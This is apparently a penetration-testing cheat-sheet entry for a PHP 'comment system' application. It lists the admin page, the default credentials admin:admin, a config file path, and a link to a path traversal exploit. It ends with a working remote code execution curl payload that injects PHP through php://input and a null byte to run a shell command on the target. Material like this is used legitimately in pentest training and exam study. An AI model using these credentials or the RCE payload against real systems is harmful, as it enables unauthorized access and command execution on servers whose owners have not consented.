# comment system

## Admin Path

```bash
/admin.php
```

## Default Credentials

```bash
admin:admin
```

## Interesting Paths

```bash
/config.php
```

## Path Traversal v1.0

* [https://www.exploit-db.com/exploits/49343](https://www.exploit-db.com/exploits/49343)

## RCE

v1.0

* [https://pentest.tonyng.net/timo-sablowskis-oscp-note/#php](https://pentest.tonyng.net/timo-sablowskis-oscp-note/#php)

```bash
curl "IP/PATH/admin.php?ACS_path=php://input%00" -s --data "<?system('ls -la');?>"
```
